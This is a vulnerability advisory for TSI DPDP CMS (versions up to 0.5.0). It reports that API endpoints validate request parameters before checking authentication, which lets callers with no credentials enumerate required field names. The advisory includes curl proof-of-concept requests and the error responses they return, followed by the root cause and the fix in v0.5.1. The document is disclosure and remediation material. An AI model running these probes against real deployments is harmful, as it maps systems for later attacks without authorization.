# TSI DPDP CMS — API Parameter Schema Enumerable Without Authentication

## Vulnerability Summary

| Field | Details |
|-------|---------|
| **Product** | TSI DPDP CMS (`tsi-coop/tsi-dpdp-cms`) |
| **Affected Versions** | ≤ 0.5.0 |
| **Fixed Version** | 0.5.1 |
| **Vulnerability Type** | Information Exposure via Pre-Authentication Parameter Validation |
| **CWE** | CWE-200 (Exposure of Sensitive Information), CWE-862 (Missing Authorization) |
| **CVSS 3.1 Score** | 3.1 Low — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Reported By** | Kavin Kumar S T |
| **Discovery Date** | 10 July 2026 |

---

## Description

TSI DPDP CMS performs **JSON schema validation before verifying the caller's authentication token** on multiple API endpoints.

When an unauthenticated attacker sends a POST request with a valid `_func` value but omits required fields, the server returns HTTP **400** and names every missing required field — all **before checking whether an Authorization header is present or valid**.

By iteratively supplying parameters one by one and observing the server's 400 error messages, an attacker can fully map the internal API parameter schema for every `_func` operation without any credentials.

**Correct behavior:** authenticate first → return HTTP 401 on missing/invalid token → never reach parameter validation.  
**Actual behavior:** validate parameters → disclose field names in error → then (if fields are present) check auth.

---

## Affected Endpoints

| Endpoint | `_func` values exposed |
|----------|----------------------|
| `POST /api/v1/admin/job` | `list_jobs`, `create_job`, `get_job`, `update_job`, `delete_job` |
| `POST /api/v1/admin/apikey` | `list_api_keys`, `create_api_key`, `revoke_api_key` |
| `POST /api/v1/admin/operator` | `list_operators`, `create_operator` |
| `POST /api/v1/dpo/ropa` | `list_entries`, `create_entry`, `retire_entry` |

---

## Proof of Concept

No authentication header is sent in any of the following requests.

### Step 1 — Discover required fields for `list_jobs`

```bash
curl -s -X POST http://TARGET:8080/api/v1/admin/job \
  -H "Content-Type: application/json" \
  -d '{"_func":"list_jobs"}'
```

**Response (HTTP 400):**
```json
{
  "error": "[$: required property 'fiduciary_id' not found]"
}
```

→ Field discovered: `fiduciary_id`

---

### Step 2 — Discover required fields for `create_job`

```bash
curl -s -X POST http://TARGET:8080/api/v1/admin/job \
  -H "Content-Type: application/json" \
  -d '{"_func":"create_job"}'
```

**Response (HTTP 400):**
```json
{
  "error": "[$: required property 'fiduciary_id' not found, $: required property 'job_type' not found, $: required property 'subtype' not found]"
}
```

→ Fields discovered: `fiduciary_id`, `job_type`, `subtype`

---

### Step 3 — Discover required fields for `list_api_keys`

```bash
curl -s -X POST http://TARGET:8080/api/v1/admin/apikey \
  -H "Content-Type: application/json" \
  -d '{"_func":"list_api_keys"}'
```

**Response (HTTP 400):**
```json
{
  "error": "[$: required property 'fiduciary_id' not found, $: required property 'status' not found]"
}
```

→ Fields discovered: `fiduciary_id`, `status`

---

### Expected Behavior (auth-first pipeline)

```bash
curl -s -X POST http://TARGET:8080/api/v1/admin/job \
  -H "Content-Type: application/json" \
  -d '{"_func":"list_jobs"}'
```

```json
{
  "error": "Unauthorized",
  "message": "Authentication failed."
}
```
HTTP 401 — no field names disclosed.

---

## Impact

An unauthenticated attacker can silently enumerate the **complete internal API parameter schema** — all `_func` names, all required field names, and field relationships — without a single valid credential.

This information directly enables more efficient targeted attacks:
- Crafting precise SQL/NoSQL injection payloads with correct field names
- Reducing brute-force effort on authenticated endpoints
- Understanding internal data model structure (e.g. `fiduciary_id` reveals the multi-tenant model)

Combined with **CVE-2026-84839** (console pages served without auth) and **CVE-2026-84840** (bootstrap endpoint without auth), this forms a complete unauthenticated reconnaissance chain.

---

## Root Cause

The middleware execution order in the API dispatcher processes schema validation before the authentication check:

```
Request → Parameter Validation → Authentication → Business Logic   ← WRONG
Request → Authentication → Parameter Validation → Business Logic   ← CORRECT
```

---

## Fix

Upgrade to **tsi-dpdp-cms v0.5.1**.

In all API routes, ensure the authentication middleware executes **before** schema/parameter validation. The server must return HTTP 401 on any missing or invalid Authorization token before any other processing occurs.

**Reference:** https://github.com/tsi-coop/tsi-dpdp-cms/releases/tag/v0.5.1

---

## References

- GitHub Repository: https://github.com/tsi-coop/tsi-dpdp-cms
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- Related: CVE-2026-84839, CVE-2026-84840, CVE-2026-84841

---
